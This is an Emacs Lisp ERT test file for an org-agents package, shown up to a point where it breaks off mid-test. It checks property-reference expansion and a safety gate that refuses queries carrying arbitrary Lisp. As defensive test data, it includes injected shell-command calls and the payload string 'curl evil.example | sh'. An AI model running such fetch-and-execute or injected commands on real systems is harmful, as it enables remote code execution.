;;; org-agents-test.el --- Tests for org-agents -*- lexical-binding: t -*-

;;; Commentary:

;; ERT tests for `org-agents'.  Run in batch with:
;;
;;   emacs -batch -L . -l org-agents-test.el \
;;     --eval '(ert-run-tests-batch-and-exit)'

;;; Code:

(require 'cl-lib)
(require 'ert)
(require 'org-agents)

;; The shipped code calls nothing in `org-colview'; the COLUMNS format it
;; generates is a string.  This suite is the only thing that compiles one,
;; through `org-columns-compile-format' and
;; `org-columns-summary-types-default', so the library is required HERE
;; rather than at the package's own load time.
(require 'org-colview)

;; Ahead of every test, because a macro used before it is defined is
;; compiled as a FUNCTION call: byte-compiling this file said "macro
;; `org-agents-test--messages' defined too late", and the gate test that
;; used it would have failed with a void-function instead of asserting
;; anything.  `make test' loads the source, where the body is expanded
;; lazily, so the suite stayed green and said nothing about it.

;; No test may read the developer's own registry, and this is where that
;; is guaranteed rather than in each fixture that happens to remember.
;; `org-agents--collect' reads the registry on every update -- it must,
;; because the prefilter's default exception and `property-resolved''s own
;; comparison have to be one read -- so a fixture that left this option at
;; its default would open `~/org/attributes.org', complete from whatever
;; vocabulary it declares, and message about whatever is malformed in it.
;; Pointed at a name that does not exist, which the package answers as
;; "nothing declared" and says nothing about.
;; `org-agents-test--with-registry' rebinds it per test where a registry
;; is the thing under test.
(setq org-agents-attributes-file
      (expand-file-name "org-agents-test-no-such-registry.org"
                        temporary-file-directory))

(defvar org-agents-test--message-log nil
  "Where `org-agents-test--messages' collects what `message' was passed.")

(defmacro org-agents-test--messages (&rest body)
  "Evaluate BODY and return the list of texts it passed to `message'.
The package reports what a save did through the echo area, which in batch
goes to stderr and is gone: capturing the calls is the only way to assert
on a message, and on the absence of one."
  (declare (indent 0))
  `(let ((org-agents-test--message-log nil))
     (cl-letf (((symbol-function 'message)
                (lambda (format &rest args)
                  ;; `message' with a nil format clears the echo area and
                  ;; has no text to record.
                  (when format
                    (let ((text (apply #'format-message format args)))
                      (push text org-agents-test--message-log)
                      text)))))
       ,@body)
     (nreverse org-agents-test--message-log)))

(ert-deftest org-agents-test-expand-truthy ()
  (should (equal (org-agents--expand '(and (todo) $URL))
                 '(and (todo) (property "URL")))))

(ert-deftest org-agents-test-expand-value-position ()
  (should (equal (org-agents--expand '(string-match "github" $URL))
                 '(string-match "github" (or (org-entry-get nil "URL") "")))))

(ert-deftest org-agents-test-expand-numeric ()
  (should (equal (org-agents--expand '(> $REVIEWS 3))
                 '(> (string-to-number (or (org-entry-get nil "REVIEWS") "0")) 3))))

(ert-deftest org-agents-test-expand-inherited-truthy ()
  (should (equal (org-agents--expand '(and (todo) $OWNER*))
                 '(and (todo) (org-entry-get nil "OWNER" t)))))

(ert-deftest org-agents-test-expand-name-position ()
  (should (equal (org-agents--expand '(property-ts $NEXT_REVIEW :to today))
                 '(property-ts "NEXT_REVIEW" :to today)))
  (should (equal (org-agents--expand '(property $KEY "v"))
                 '(property "KEY" "v"))))

(ert-deftest org-agents-test-expand-nested-query ()
  (should (equal (org-agents--expand '(parent (and $KEY (todo))))
                 '(parent (and (property "KEY") (todo))))))

(ert-deftest org-agents-test-expand-specials ()
  (should (equal (org-agents--expand '(string-match "Review:" $ITEM))
                 '(string-match "Review:" (org-get-heading t t t t)))))

(ert-deftest org-agents-test-expand-boolean-special-todo ()
  "A bare special in boolean position tests the entry, not a property row."
  (should (equal (org-agents--expand '(and (todo) $TODO))
                 '(and (todo) (org-get-todo-state))))
  ;; A special names the entry itself, so inheritance does not apply.
  (should (equal (org-agents--expand '(and (todo) $TODO*))
                 '(and (todo) (org-get-todo-state)))))

(ert-deftest org-agents-test-expand-boolean-special-tags ()
  (should (equal (org-agents--expand '$TAGS) '(org-get-tags)))
  (should (equal (org-agents--expand '$ITEM) '(org-get-heading t t t t)))
  ;; A non-special bare ref is still a property test.
  (should (equal (org-agents--expand '$URL) '(property "URL"))))

(ert-deftest org-agents-test-expand-special-in-numeric-position ()
  "A special manages its own type, so numeric position adds no coercion.
`org-current-level' answers with a number already, and wrapping it in
`string-to-number' would read every level as zero."
  (should (equal (org-agents--expand '(> $LEVEL 2))
                 '(> (org-current-level) 2))))

(ert-deftest org-agents-test-expand-inherited-value-and-numeric ()
  "The star travels into value and numeric position, not just boolean."
  (should (equal (org-agents--expand '(string-match "x" $OWNER*))
                 '(string-match "x" (or (org-entry-get nil "OWNER" t) ""))))
  (should (equal (org-agents--expand '(> $REVIEWS* 3))
                 '(> (string-to-number (or (org-entry-get nil "REVIEWS" t) "0"))
                     3))))

(ert-deftest org-agents-test-expand-degenerate-refs-stay-symbols ()
  "`$' and `$*' name no property, and are left for the gate to refuse.
Read as references they would reach `org-entry-get' as the empty name,
which answers nil at every entry -- an agent that matches nothing, and
nothing said about why.  Left as the symbols they are, the gate's
leftover-reference check names them."
  (should (null (org-agents--ref-p '$)))
  (should (null (org-agents--ref-p '$*)))
  (dolist (form '($ $* (property $*) (and (todo) $*) (string-match "x" $)))
    (should (equal (org-agents--expand form) form))
    (let ((err (should-error (org-agents--gate (org-agents--expand form))
                             :type 'user-error)))
      (should (string-match-p "no expansion for"
                              (error-message-string err)))))
  ;; An ordinary reference is unaffected, suffix and all.  The cdr is the
  ;; AXIS the suffix names, not a flag: `inherit' is the outline axis and
  ;; `proto' the prototype one.
  (should (equal '("URL" . nil) (org-agents--ref-p '$URL)))
  (should (equal '("URL" . inherit) (org-agents--ref-p '$URL*)))
  (should (equal '("URL" . proto) (org-agents--ref-p '$URL^))))

(ert-deftest org-agents-test-expand-caret-in-every-position ()
  "The three axes in all four positions: twelve cells, spelled out.
`$N' is the entry's own drawer, `$N*' the OUTLINE axis -- `org-entry-get'
with INHERIT -- and `$N^' the PROTOTYPE axis.  They are orthogonal, and
at most one suffix may be written.

The quiet resolver in value and numeric position, never the signalling
one: residual Lisp runs at every candidate entry, and a `user-error'
there aborts the whole update."
  ;; Boolean.
  (should (equal (org-agents--expand '(and (todo) $STATUS))
                 '(and (todo) (property "STATUS"))))
  (should (equal (org-agents--expand '(and (todo) $STATUS*))
                 '(and (todo) (org-entry-get nil "STATUS" t))))
  (should (equal (org-agents--expand '(and (todo) $STATUS^))
                 '(and (todo) (property-resolved "STATUS"))))
  ;; Value.
  (should (equal (org-agents--expand '(string-match "x" $STATUS))
                 '(string-match "x" (or (org-entry-get nil "STATUS") ""))))
  (should (equal (org-agents--expand '(string-match "x" $STATUS*))
                 '(string-match "x" (or (org-entry-get nil "STATUS" t) ""))))
  (should (equal (org-agents--expand '(string-match "x" $STATUS^))
                 '(string-match
                   "x" (or (org-agents-resolve-property-quietly "STATUS") ""))))
  ;; Numeric.
  (should (equal (org-agents--expand '(> $REVIEWS 3))
                 '(> (string-to-number (or (org-entry-get nil "REVIEWS") "0"))
                     3)))
  (should (equal (org-agents--expand '(> $REVIEWS* 3))
                 '(> (string-to-number (or (org-entry-get nil "REVIEWS" t) "0"))
                     3)))
  (should (equal (org-agents--expand '(> $REVIEWS^ 3))
                 '(> (string-to-number
                      (or (org-agents-resolve-property-quietly "REVIEWS") "0"))
                     3)))
  ;; Name.
  (should (equal (org-agents--expand '(property $STATUS)) '(property "STATUS")))
  (should (equal (org-agents--expand '(property $STATUS*))
                 '(property "STATUS")))
  (should (equal (org-agents--expand '(property-resolved $STATUS^))
                 '(property-resolved "STATUS"))))

(ert-deftest org-agents-test-expand-three-axes-are-three-predicates ()
  "`$N', `$N*' and `$N^' expand to three DISTINCT forms, pairwise.
Collapsing any two of them would make a query mean something other than
what it says -- and the caret cell is asserted string-for-string against
`(property-resolved \"N\")', because that is the predicate the prefilter's
widening keys on."
  (let ((forms (mapcar #'org-agents--expand '($STATUS $STATUS* $STATUS^))))
    (should (equal (nth 0 forms) '(property "STATUS")))
    (should (equal (nth 1 forms) '(org-entry-get nil "STATUS" t)))
    (should (equal (nth 2 forms) '(property-resolved "STATUS")))
    (should-not (equal (nth 0 forms) (nth 1 forms)))
    (should-not (equal (nth 0 forms) (nth 2 forms)))
    (should-not (equal (nth 1 forms) (nth 2 forms)))))

(ert-deftest org-agents-test-expand-caret-is-no-longer-a-property-name ()
  "`$STATUS^' was MEASURED to expand as a property literally named `STATUS^'.
A silent misreading: `(property \"STATUS^\")' is a valid org-ql query that
matches nothing, and `(> $REVIEWS^ 3)' read a property nothing has as
zero.  This pins the misread shut."
  (should-not (equal (org-agents--expand '$STATUS^) '(property "STATUS^")))
  (should-not (equal (org-agents--expand '(> $REVIEWS^ 3))
                     '(> (string-to-number
                          (or (org-entry-get nil "REVIEWS^") "0")) 3)))
  (should (equal '("STATUS" . proto) (org-agents--ref-p '$STATUS^))))

(ert-deftest org-agents-test-expand-refuses-a-double-suffix ()
  "At most ONE suffix: `$N*^' and `$N^*' name no axis, and are refused.
Read as a reference either would name a property whose key holds a `*' or
a `^', which no drawer spells -- an agent that matches nothing, and
nothing said about why.  Left as the symbols they are, the gate's
leftover-reference check names them."
  (dolist (form '($STATUS*^ $STATUS^* $STATUS** $STATUS^^))
    (should (null (org-agents--ref-p form)))
    (should (equal (org-agents--expand form) form))
    (let ((err (should-error (org-agents--gate (org-agents--expand form))
                             :type 'user-error)))
      (should (string-match-p "no expansion for"
                              (error-message-string err))))))

(ert-deftest org-agents-test-expand-caret-on-a-special-is-the-accessor ()
  "A special names the entry itself, so a caret on one is ignored.
Exactly as a star is: there is no property row of that name for a
prototype to carry, and `(property-resolved \"TODO\")' would be a query
that never matches."
  (should (equal (org-agents--expand '$ITEM^) '(org-get-heading t t t t)))
  (should (equal (org-agents--expand '$TODO^) '(org-get-todo-state)))
  (should (equal (org-agents--expand '$ITEM^) (org-agents--expand '$ITEM*)))
  (should (equal (org-agents--expand '(> $LEVEL^ 2)) '(> (org-current-level) 2))))

(ert-deftest org-agents-test-expand-caret-in-value-position-is-not-safe ()
  "The documented asymmetry: `$N^' is safe in boolean position and not in value.
In boolean position it becomes a known org-ql predicate, which the gate
admits unremarked.  In value position it becomes residual Lisp -- a call
to `org-agents-resolve-property-quietly' -- and the gate asks about it
once, exactly as it asks about `$N*'.  Exempting it would be widening the
gate Epic 1 has just hardened, for a caller this package cannot
distinguish from any other function call in a query."
  (should (org-agents--structurally-safe-p (org-agents--expand '$STATUS^)))
  (should-not (org-agents--structurally-safe-p
               (org-agents--expand '(string-match "x" $STATUS^))))
  ;; And `$N*' is no different, which is the point of calling it an
  ;; asymmetry between POSITIONS rather than between axes.
  (should-not (org-agents--structurally-safe-p (org-agents--expand '$STATUS*)))
  (should-not (org-agents--structurally-safe-p
               (org-agents--expand '(string-match "x" $STATUS*)))))

(ert-deftest org-agents-test-expand-passthrough ()
  (should (equal (org-agents--expand '(and (todo "TODO") (tags "urgent")))
                 '(and (todo "TODO") (tags "urgent")))))

(ert-deftest org-agents-test-gate-structural-safe-no-prompt ()
  (cl-letf (((symbol-function 'yes-or-no-p)
             (lambda (&rest _) (error "must not prompt"))))
    (should (org-agents--gate '(and (todo "TODO") (property "URL"))))))

(ert-deftest org-agents-test-gate-refuses-bare-call ()
  "An unapproved arbitrary call is refused AND never evaluated, inside (and ...).
The refusal and the non-evaluation are two claims, and a `should-not' on
the gate makes only the first: it establishes that the gate answered nil,
not that nothing ran on the way to answering.  MEASURED: a gate mutated
to `(dolist (sub (cdr query)) (ignore-errors (eval sub t)))' before its
`or' still answers nil, so a single `should-not' stays green while the
call it was named for has run.  The second arm is what catches that.

The tripwire is a COUNTER rather than a stub that signals.  The gate
reaches `user-error' on some paths and its callers catch broadly, so a
raising stub can be swallowed and read as a pass; a counter cannot be.
`org-agents-test-gate-refuses-call-in-predicate-argument' makes the same
claim the same way for a call in a predicate's argument."
  (let ((org-agents--session-approved (make-hash-table :test 'equal))
        (org-agents-safe-queries nil)
        (noninteractive t))
    ;; Refused.  Keeps the literal form the spec's Verification section
    ;; cites by name.  Nothing writes `/tmp/pwned': the point is that the
    ;; call never runs, and the suite writes only under its own temporary
    ;; directories.
    (should-not (org-agents--gate '(and (todo) (shell-command "touch /tmp/pwned"))))
    ;; And nothing in it was evaluated on the way to the refusal.
    (let ((org-agents-test--tripwire-count 0))
      (should-not (org-agents--gate
                   '(and (todo) (org-agents-test--tripwire "touch /tmp/pwned"))))
      (should (= 0 org-agents-test--tripwire-count)))))

(ert-deftest org-agents-test-gate-residual-needs-approval-then-passes ()
  (let ((org-agents--session-approved (make-hash-table :test 'equal))
        (org-agents-safe-queries nil)
        ;; Take the prompting path rather than the batch skip.
        (noninteractive nil)
        (query '(and (todo) (string-match "x" (or (org-entry-get nil "URL") "")))))
    (cl-letf (((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
      (should (org-agents--gate query)))
    ;; Second call: memoized, no prompt.
    (cl-letf (((symbol-function 'yes-or-no-p)
               (lambda (&rest _) (error "must not re-prompt"))))
      (should (org-agents--gate query)))))

(ert-deftest org-agents-test-gate-rejects-a-misspelled-head ()
  (should-error (org-agents--gate '(headline "foo")) :type 'user-error))

(ert-deftest org-agents-test-gate-rejects-leftover-ref ()
  (should-error (org-agents--gate '(property "K" $VALUE)) :type 'user-error))

(ert-deftest org-agents-test-gate-hash-resists-print-truncation ()
  "Two queries differing past `print-length' must not share an approval."
  (let ((print-length 2)
        (print-level 2))
    (should-not (equal (org-agents--query-hash
                        '(and (todo) (tags "a") (shell-command "safe")))
                       (org-agents--query-hash
                        '(and (todo) (tags "a") (shell-command "pwned")))))))

(defconst org-agents-test--deep-query
  '(and (todo) (tags "a") (or (ignore) (progn (progn (progn (shell-command "pwned"))))))
  "A query whose refusable leaf sits deeper than a small print limit.
Both `print-level' 2 and `print-length' 2 elide it, so a display site
that prints with `%S' shows the user `(and (todo) ...)' while the hash
covers the whole form.")

(ert-deftest org-agents-test-gate-prompt-shows-what-the-hash-covers ()
  "The approval prompt must show every part of what it hashes.
`org-agents--query-hash' prints with `print-level' and `print-length'
bound to nil; a prompt that does not is asking about less than it
remembers."
  (let ((print-length 2)
        (print-level 2)
        (noninteractive nil)
        (org-agents--session-approved (make-hash-table :test 'equal))
        (org-agents-safe-queries nil)
        (query org-agents-test--deep-query)
        (prompt nil))
    (cl-letf (((symbol-function 'yes-or-no-p)
               (lambda (p &rest _) (setq prompt p) nil)))
      (should-not (org-agents--gate query)))
    (should prompt)
    (should (string-match-p "pwned" prompt))
    (should-not (string-match-p "\\.\\.\\." prompt))
    ;; And the text shown is the very text that is hashed, not merely
    ;; another unabbreviated printing of the same form.
    (should (string-match-p (regexp-quote (org-agents--query-text query))
                            prompt))))

(ert-deftest org-agents-test-gate-batch-skip-message-is-unabbreviated ()
  "The batch skip says which query it skipped, all of it.
In batch there is no prompt, so this message is the only account of what
was refused; truncated, it names a prefix several queries share."
  (let* ((print-length 2)
         (print-level 2)
         (noninteractive t)
         (org-agents--session-approved (make-hash-table :test 'equal))
         (org-agents-safe-queries nil)
         (query org-agents-test--deep-query)
         (texts (org-agents-test--messages
                  (should-not (org-agents--gate query))))
         (text (car (last texts))))
    (should text)
    (should (string-match-p "pwned" text))
    (should-not (string-match-p "\\.\\.\\." text))))

(ert-deftest org-agents-test-query-hash-unchanged-by-the-printer-refactor ()
  "The hash of a query is a fixed value, pinned against a printer change.
Routing hash, prompt and stored text through one printer must not change
what any of them hashes.  Both literals were computed with the shipped
code, as `(sha1 (prin1-to-string FORM))' under nil print bindings.

The second form carries string literals on purpose.  `format' with `%s'
prints a query almost the way `prin1-to-string' does -- the two agree
exactly on `(and (todo) (ignore))' -- and differ only where a datum
needs its reader syntax.  A pin over a string-free form would therefore
hold under a printer that has stopped being a *reader* printer, and
`(tags \"a\")' and `(tags a)' are not the same query."
  (should (equal (org-agents--query-hash '(and (todo) (ignore)))
                 "d11e5a6f8f3f90c5ffe017ed7c17245dda308083"))
  (should (equal (org-agents--query-hash
                  '(and (todo) (tags "a")
                        (string-match "x" (or (org-entry-get nil "URL") ""))))
                 "97ab403ea3f907c58ad09d4c20fe95103e1083a5"))
  ;; `print-circle' abbreviates a shared substructure to `#1#', which is
  ;; the same failure as a truncation by another variable: the user would
  ;; be shown a reference where the hash covers the referent.  A query
  ;; read out of a property drawer cannot share structure, but one built
  ;; by a caller can, so the printer binds this too.
  (let* ((sub '(todo))
         (print-circle t))
    (should (equal (org-agents--query-hash (list 'and sub sub))
                   (org-agents--query-hash '(and (todo) (todo)))))))

(ert-deftest org-agents-test-query-text-cannot-be-broken-into-lines ()
  "A string in the query cannot push the rest of it out of the minibuffer.
The prompt is one line in a window capped at `max-mini-window-height' and
scrolled to point, which sits at its END.  So newlines in a `regexp'
argument put the dangerous conjunct above the top of the window and left
the user answering yes to a prompt that appeared to ask about nothing --
while the hash covered every line of it.  `print-escape-newlines' and
`print-escape-control-characters' are what close that, and neither was
bound before."
  (let* ((payload "curl evil.example | sh")
         (query `(and (shell-command ,payload)
                      (regexp ,(concat "a" (make-string 40 ?\n) "b\^Ac"))))
         (text (org-agents--query-text query)))
    (should (= 0 (cl-count ?\n text)))
    (should (= 0 (cl-count ?\C-a text)))
    (should (string-match-p (regexp-quote payload) text))
    ;; And the prompt the user actually answers is that same one line.
    (let* ((org-agents--session-approved (make-hash-table :test 'equal))
           (org-agents-safe-queries nil)
           (org-agents-refused-queries nil)
           (noninteractive nil)
           prompt)
      (cl-letf (((symbol-function 'yes-or-no-p)
                 (lambda (text) (setq prompt text) nil)))
        (should-not (org-agents--gate query)))
      (should prompt)
      (should (= 0 (cl-count ?\n prompt)))
      (should (string-match-p (regexp-quote payload) prompt)))))

(ert-deftest org-agents-test-query-hash-separates-an-uninterned-symbol ()
  "Two different forms must not share one approval.
`print-gensym' was left at its default nil, under which an uninterned
symbol prints as its bare name: a form holding `#:ignore' printed, and so
hashed, exactly as the form holding `ignore' did, and one approval
answered for both."
  (let ((interned '(and (todo) (ignore)))
        (uninterned (list 'and '(todo) (list (make-symbol "ignore")))))
    (should-not (equal interned uninterned))
    (should-not (equal (org-agents--query-hash interned)
                       (org-agents--query-hash uninterned)))))

(ert-deftest org-agents-test-leftover-ref-diagnostic-is-unabbreviated ()
  "The leftover-reference message names the conjunct the reference sits in.
It printed with `%S' under whatever `print-length' the user's init sets,
which elided exactly the part of the query the message exists to point
at.  It goes through the one printer now, like the gate's two display
sites."
  (let* ((print-length 2)
         (print-level 2)
         (err (should-error
               (org-agents--check-spelling
                '(and (todo) (tags "a") (property "KIND" $NOPE)))
               :type 'user-error))
         (text (error-message-string err)))
    (should (string-match-p "\\$NOPE" text))
    (should (string-match-p "KIND" text))
    (should-not (string-match-p "\\.\\.\\." text))))

(ert-deftest org-agents-test-gate-master-switch-off ()
  (let ((org-ql-ask-unsafe-queries nil)
        (org-agents--session-approved (make-hash-table :test 'equal)))
    (cl-letf (((symbol-function 'yes-or-no-p)
               (lambda (&rest _) (error "must not prompt"))))
      (should (org-agents--gate '(ignore))))))

(defvar org-agents-test--tripwire-count 0
  "Incremented by `org-agents-test--tripwire' when it is evaluated.")

(defun org-agents-test--tripwire (&rest _)
  "Record an evaluation the gate was supposed to prevent."
  (setq org-agents-test--tripwire-count (1+ org-agents-test--tripwire-count))
  t)

(ert-deftest org-agents-test-gate-covers-the-exclude ()
  "The gate judges the form that runs, `org-agents-exclude' included.
The exclusion is Lisp out of the same configuration a query is, and it
is conjoined into every agent query and every preview.  Gating the query
alone approved a form nobody had been shown."
  (let ((org-agents--session-approved (make-hash-table :test 'equal))
        (org-agents-safe-queries nil)
        (noninteractive t))
    (let ((org-agents-exclude '(shell-command "touch /tmp/pwned")))
      (should (org-agents--structurally-safe-p '(todo)))
      (should-not (org-agents--gate (org-agents--effective-query '(todo)))))
    ;; And nothing in the refused form is evaluated while it is judged.
    (let ((org-agents-exclude '(org-agents-test--tripwire))
          (org-agents-test--tripwire-count 0))
      (should-not (org-agents--gate (org-agents--effective-query '(todo))))
      (should (= 0 org-agents-test--tripwire-count)))))

(ert-deftest org-agents-test-gate-hash-changes-with-the-exclude ()
  "One query hashes differently under two exclusions.
An approval names a form, not a query, so a change to the exclusion has
to invalidate it."
  (let* ((query '(and (todo) (foo)))
         (h1 (let ((org-agents-exclude '(not (property "AGENT_MATCH"))))
               (org-agents--query-hash (org-agents--effective-query query))))
         (h2 (let ((org-agents-exclude '(not (property "OTHER"))))
               (org-agents--query-hash (org-agents--effective-query query)))))
    (should-not (equal h1 h2))
    ;; With the exclusion off the form is the bare query again, so the
    ;; nil branch hashes what it always did.
    (let ((org-agents-exclude nil))
      (should (equal (org-agents--query-hash (org-agents--effective-query query))
                     (org-agents--query-hash query))))))

(ert-deftest org-agents-test-gate-approval-does-not-carry-across-excludes ()
  "A remembered approval does not answer for a changed exclusion.
The hash comparison stated as the user sees it: the gate asks again."
  (let ((org-agents--session-approved (make-hash-table :test 'equal))
        (org-agents-safe-queries nil)
        (noninteractive nil)
        (query '(and (todo) (string-match "x" (or (org-entry-get nil "URL") "")))))
    (let ((org-agents-exclude '(not (property "AGENT_MATCH"))))
      ;; Approve once, answering the "run it?" prompt only: the second
      ;; prompt offers to persist, which these bindings do not want.
      (cl-letf (((symbol-function 'yes-or-no-p)
                 (lambda (p &rest _) (string-match-p "run it" p))))
        (should (org-agents--gate (org-agents--effective-query query))))
      ;; Memoized under that exclusion: no second question.
      (cl-letf (((symbol-function 'yes-or-no-p)
                 (lambda (&rest _) (error "must not re-prompt"))))
        (should (org-agents--gate (org-agents--effective-query query)))))
    ;; A different exclusion is a different form, and is asked about.
    (let ((org-agents-exclude '(not (property "OTHER"))))
      (cl-letf (((symbol-function 'yes-or-no-p)
                 (lambda (&rest _) (error "must not re-prompt"))))
        (let ((err (should-error
                    (org-agents--gate (org-agents--effective-query query)))))
          (should (string-match-p "must not re-prompt"
                                  (error-message-string err))))))))

(ert-deftest org-agents-test-refused-heads-ships-the-io-bearing-head ()
  "`semantic' ships refused, because its normalizer spawns a subprocess.
org-ql runs a predicate's normalizer when it compiles a query, after the
gate has admitted the head and before any entry is examined.
`org-ql-semantic.el' defines `semantic' with a normalizer that calls
`org-ql-semantic--ensure-cache', which `call-process'es `org db search'.
Nothing in the query says so, and structurally it is a predicate call
like `(tags \"a\")', so the safe list admits it without a prompt.
Emptying this default is a decision, and has to argue with this test."
  (should (memq 'semantic (default-value 'org-agents-refused-heads))))

(ert-deftest org-agents-test-refused-head-search-descends-everywhere ()
  "A refused head is found wherever it sits in the form.
The walk is where a bug in this would hide: a head is refusable in
argument position and under a nested query, not only in the car of the
form as a whole."
  (let ((org-agents-refused-heads '(semantic)))
    (should (eq 'semantic (org-agents--refused-head '(semantic "x"))))
    (should (eq 'semantic (org-agents--refused-head '(and (todo) (semantic "x")))))
    (should (eq 'semantic
                (org-agents--refused-head '(parent (and (todo) (semantic "x"))))))
    (should (eq 'semantic
                (org-agents--refused-head '(property "K" (semantic "x")))))
    ;; Conservative on purpose: quoted data is exempt from the structural
    ;; check, and is not exempt here.  Failing closed costs a shape
    ;; nobody writes; failing open costs a subprocess.
    (should (eq 'semantic (org-agents--refused-head '(quote (semantic "x")))))
    ;; A string is not a head, and neither is a property name.
    (should-not (org-agents--refused-head '(and (todo) (tags "semantic"))))
    (should-not (org-agents--refused-head '(and (todo) (property "SEMANTIC"))))
    ;; A dotted form is walked without signaling.
    (should-not (org-agents--refused-head '(and (todo) . foo)))))

(ert-deftest org-agents-test-gate-refuses-a-refused-head ()
  "A refused head is refused, and says which head it was.
`tags' stands in for `semantic' here so the test does not depend on
`org-ql-semantic' being loaded: it is a real org-ql predicate, so the
form is genuinely structurally safe and refusal is the only thing that
can stop it."
  (let ((org-agents-refused-heads '(tags))
        (org-agents-safe-queries nil)
        (org-agents--session-approved (make-hash-table :test 'equal))
        (noninteractive t))
    (should (org-agents--structurally-safe-p '(and (todo) (tags "a"))))
    (let ((err (should-error (org-agents--gate '(and (todo) (tags "a")))
                             :type 'user-error)))
      (should (string-match-p "tags" (error-message-string err)))
      (should (string-match-p "refused" (error-message-string err))))
    ;; An ordinary head is unaffected, and still does not prompt.
    (cl-letf (((symbol-function 'yes-or-no-p)
               (lambda (&rest _) (error "must not prompt"))))
      (should (org-agents--gate '(and (todo) (property "K")))))))

(ert-deftest org-agents-test-gate-refused-head-beats-a-remembered-approval ()
  "Nothing buys a refused head a pass -- no approval, and not the switch.
The head is refused because its normalizer runs code, which an approval
of the query's text was never a judgment about."
  (let* ((form '(and (todo) (tags "a")))
         (hash (org-agents--query-hash form))
         (org-agents-refused-heads '(tags))
         (org-agents-safe-queries (list hash))
         (org-agents--session-approved (make-hash-table :test 'equal))
         (noninteractive t))
    (puthash hash t org-agents--session-approved)
    (should-error (org-agents--gate form) :type 'user-error)
    ;; `org-ql-ask-unsafe-queries' governs asking, and a refused head is
    ;; not a question.
    (let ((org-ql-ask-unsafe-queries nil))
      (should-error (org-agents--gate form) :type 'user-error))))

(ert-deftest org-agents-test-gate-refused-head-covers-the-exclude ()
  "A refused head in the exclusion is refused too.
The gate sees the appended form, so the exclusion is scanned with the
query -- which is why the refusal check had to land after the gate began
receiving that form."
  (let ((org-agents-refused-heads '(tags))
        (org-agents-exclude '(not (tags "generated")))
        (org-agents-safe-queries nil)
        (org-agents--session-approved (make-hash-table :test 'equal))
        (noninteractive t))
    (let ((err (should-error
                (org-agents--gate (org-agents--effective-query '(todo)))
                :type 'user-error)))
      (should (string-match-p "tags" (error-message-string err))))))

(ert-deftest org-agents-test-gate-refuses-a-structurally-safe-query ()
  "A refused QUERY is refused even where the safe list would admit it.
The refusal check has to sit above the structural test and not inside the
branch below it, or a refusal of a form built from real org-ql predicates
-- the case that arises the moment the package defining a predicate is
loaded, or a hash is added through customize -- would be looked up only
for forms that were already unsafe.  Every other refused-query test uses
an unsafe form, so nothing else here would notice."
  (let* ((form '(and (todo) (tags "a")))
         (org-agents-refused-queries
          (list (cons (org-agents--query-hash form)
                      (org-agents--query-text form))))
         (org-agents-safe-queries nil)
         (org-agents--session-approved (make-hash-table :test 'equal))
         (noninteractive t))
    (should (org-agents--structurally-safe-p form))
    (let ((err (should-error (org-agents--gate form) :type 'user-error)))
      (should (string-match-p "refused" (error-message-string err))))
    ;; And the switch that turns asking off does not turn refusal off.
    (let ((org-ql-ask-unsafe-queries nil))
      (should-error (org-agents--gate form) :type 'user-error))
    ;; A neighbouring safe query is unaffected.
    (cl-letf (((symbol-function 'yes-or-no-p)
               (lambda (&rest _) (error "must not prompt"))))
      (should (org-agents--gate '(and (todo) (tags "b")))))))

(ert-deftest org-agents-test-gate-refuses-call-in-predicate-argument ()
  "A known predicate must not vouch for arbitrary Lisp in its arguments."
  (let ((org-agents--session-approved (make-hash-table :test 'equal))
        (org-agents-safe-queries nil)
        (noninteractive t))
    (should-not (org-agents--structurally-safe-p
                 '(and (todo) (tags (shell-command "x")))))
    (should-not (org-agents--gate '(and (todo) (tags (shell-command "x")))))
    (should-not (org-agents--gate '(property "K" (shell-command "x"))))
    (should-not (org-agents--gate '(level (shell-command "x"))))
    ;; Nothing in a refused query is evaluated while judging it.
    (let ((org-agents-test--tripwire-count 0))
      (should-not (org-agents--gate '(and (todo) (tags (org-agents-test--tripwire)))))
      (should (= 0 org-agents-test--tripwire-count)))
    ;; Benign predicate arguments stay safe, and still do not prompt.
    (cl-letf (((symbol-function 'yes-or-no-p)
               (lambda (&rest _) (error "must not prompt"))))
      (should (org-agents--gate '(ts :from -7 :to today)))
      (should (org-agents--gate '(tags "urgent" "a")))
      (should (org-agents--gate '(parent (and (property "KEY") (todo)))))
      (should (org-agents--gate '(and (todo "TODO") (property "URL")))))))

(ert-deftest org-agents-test-gate-rejects-improper-list ()
  "A dotted query fails closed, rather than signaling a raw type error."
  (let ((org-agents--session-approved (make-hash-table :test 'equal))
        (org-agents-safe-queries nil)
        (noninteractive t))
    (should-not (org-agents--gate '(and (todo) . foo)))))

(ert-deftest org-agents-test-gate-misspelled-head-in-argument ()
  "A misspelled head is caught in a predicate argument, but not in Lisp."
  (should-error (org-agents--gate '(property "K" (headline "x")))
                :type 'user-error)
  (should-error (org-agents--gate '(property "K" (re "y")))
                :type 'user-error)
  ;; Residual Lisp is code, not a query: `p' is a variable here, and
  ;; diagnosing it would answer a question the user was never asked.
  (let ((org-agents--session-approved (make-hash-table :test 'equal))
        (org-agents-safe-queries nil)
        (noninteractive t))
    (should-not (org-agents--gate '(and (todo) (let ((p 1)) (> p 0)))))))

(ert-deftest org-agents-test-gate-allows-list-valued-arg ()
  "A list-valued argument is data, as org-ql's own `src' spelling needs."
  (cl-letf (((symbol-function 'yes-or-no-p)
             (lambda (&rest _) (error "must not prompt"))))
    (should (org-agents--gate '(src :lang "elisp" :regexps ("defun"))))
    (should (org-agents--gate '(src :regexps ("a" "b"))))
    (should (org-agents--gate
             '(and (todo) (src :lang "elisp" :regexps ("defun")))))
    ;; org-ql's normalizer accepts an already-quoted list here too.
    (should (org-agents--gate '(src :regexps '("defun"))))
    ;; Everything that was safe before stays safe.
    (should (org-agents--gate '(ts :from -7 :to today)))
    (should (org-agents--gate '(tags "urgent" "a")))
    (should (org-agents--gate '(scheduled :to today)))
    (should (org-agents--gate '(parent (and (property "KEY") (todo)))))))

(ert-deftest org-agents-test-gate-refuses-call-in-list-element ()
  "A call hiding inside a data list is still a call."
  (let ((org-agents--session-approved (make-hash-table :test 'equal))
        (org-agents-safe-queries nil)
        (noninteractive t))
    (should-not (org-agents--gate '(and (todo) (tags ((shell-command "x"))))))
    (should-not (org-agents--gate '((shell-command "x"))))
    ;; A keyword's value is evaluated like any other argument.
    (should-not (org-agents--gate '(ts :from (shell-command "x"))))
    (should-not (org-agents--gate '(lambda (x) (shell-command "x"))))))

(ert-deftest org-agents-test-gate-refuses-bytecode-in-function-position ()
  "A byte-code object reads in from a property, and Emacs calls what it finds."
  (let ((org-agents--session-approved (make-hash-table :test 'equal))
